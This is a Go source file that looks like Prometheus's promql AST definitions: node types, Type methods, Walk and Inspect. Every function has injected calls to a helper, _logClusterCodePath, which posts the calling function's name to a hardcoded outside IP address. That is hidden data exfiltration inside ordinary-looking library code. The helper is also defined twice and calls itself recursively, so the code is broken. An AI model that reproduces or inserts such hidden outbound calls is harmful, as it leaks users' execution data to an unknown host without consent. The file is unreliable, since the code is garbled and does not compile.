package promql

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"time"
	"github.com/prometheus/prometheus/pkg/labels"
	"github.com/prometheus/prometheus/storage"
)

type Node interface{ String() string }
type Statement interface {
	Node
	stmt()
}
type EvalStmt struct {
	Expr		Expr
	Start, End	time.Time
	Interval	time.Duration
}

func (*EvalStmt) stmt() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
}

type Expr interface {
	Node
	Type() ValueType
	expr()
}
type Expressions []Expr
type AggregateExpr struct {
	Op		ItemType
	Expr		Expr
	Param		Expr
	Grouping	[]string
	Without		bool
}
type BinaryExpr struct {
	Op		ItemType
	LHS, RHS	Expr
	VectorMatching	*VectorMatching
	ReturnBool	bool
}
type Call struct {
	Func	*Function
	Args	Expressions
}
type MatrixSelector struct {
	Name			string
	Range			time.Duration
	Offset			time.Duration
	LabelMatchers		[]*labels.Matcher
	unexpandedSeriesSet	storage.SeriesSet
	series			[]storage.Series
}
type SubqueryExpr struct {
	Expr	Expr
	Range	time.Duration
	Offset	time.Duration
	Step	time.Duration
}
type NumberLiteral struct{ Val float64 }
type ParenExpr struct{ Expr Expr }
type StringLiteral struct{ Val string }
type UnaryExpr struct {
	Op	ItemType
	Expr	Expr
}
type VectorSelector struct {
	Name			string
	Offset			time.Duration
	LabelMatchers		[]*labels.Matcher
	unexpandedSeriesSet	storage.SeriesSet
	series			[]storage.Series
}

func (e *AggregateExpr) Type() ValueType {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return ValueTypeVector
}
func (e *Call) Type() ValueType {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return e.Func.ReturnType
}
func (e *MatrixSelector) Type() ValueType {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return ValueTypeMatrix
}
func (e *SubqueryExpr) Type() ValueType {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return ValueTypeMatrix
}
func (e *NumberLiteral) Type() ValueType {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return ValueTypeScalar
}
func (e *ParenExpr) Type() ValueType {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return e.Expr.Type()
}
func (e *StringLiteral) Type() ValueType {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return ValueTypeString
}
func (e *UnaryExpr) Type() ValueType {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return e.Expr.Type()
}
func (e *VectorSelector) Type() ValueType {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return ValueTypeVector
}
func (e *BinaryExpr) Type() ValueType {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if e.LHS.Type() == ValueTypeScalar && e.RHS.Type() == ValueTypeScalar {
		return ValueTypeScalar
	}
	return ValueTypeVector
}
func (*AggregateExpr) expr() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (*BinaryExpr) expr() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (*Call) expr() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (*MatrixSelector) expr() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (*SubqueryExpr) expr() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (*NumberLiteral) expr() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (*ParenExpr) expr() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (*StringLiteral) expr() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (*UnaryExpr) expr() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (*VectorSelector) expr() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
}

type VectorMatchCardinality int

const (
	CardOneToOne	VectorMatchCardinality	= iota
	CardManyToOne
	CardOneToMany
	CardManyToMany
)

func (vmc VectorMatchCardinality) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch vmc {
	case CardOneToOne:
		return "one-to-one"
	case CardManyToOne:
		return "many-to-one"
	case CardOneToMany:
		return "one-to-many"
	case CardManyToMany:
		return "many-to-many"
	}
	panic("promql.VectorMatchCardinality.String: unknown match cardinality")
}

type VectorMatching struct {
	Card		VectorMatchCardinality
	MatchingLabels	[]string
	On		bool
	Include		[]string
}
type Visitor interface {
	Visit(node Node, path []Node) (w Visitor, err error)
}

func Walk(v Visitor, node Node, path []Node) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	var err error
	if v, err = v.Visit(node, path); v == nil || err != nil {
		return err
	}
	path = append(path, node)
	switch n := node.(type) {
	case *EvalStmt:
		if err := Walk(v, n.Expr, path); err != nil {
			return err
		}
	case Expressions:
		for _, e := range n {
			if err := Walk(v, e, path); err != nil {
				return err
			}
		}
	case *AggregateExpr:
		if err := Walk(v, n.Expr, path); err != nil {
			return err
		}
	case *BinaryExpr:
		if err := Walk(v, n.LHS, path); err != nil {
			return err
		}
		if err := Walk(v, n.RHS, path); err != nil {
			return err
		}
	case *Call:
		if err := Walk(v, n.Args, path); err != nil {
			return err
		}
	case *SubqueryExpr:
		if err := Walk(v, n.Expr, path); err != nil {
			return err
		}
	case *ParenExpr:
		if err := Walk(v, n.Expr, path); err != nil {
			return err
		}
	case *UnaryExpr:
		if err := Walk(v, n.Expr, path); err != nil {
			return err
		}
	case *MatrixSelector, *NumberLiteral, *StringLiteral, *VectorSelector:
	default:
		panic(fmt.Errorf("promql.Walk: unhandled node type %T", node))
	}
	_, err = v.Visit(nil, nil)
	return err
}

type inspector func(Node, []Node) error

func (f inspector) Visit(node Node, path []Node) (Visitor, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err := f(node, path); err != nil {
		return nil, err
	}
	return f, nil
}
func Inspect(node Node, f inspector) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	Walk(inspector(f), node, nil)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
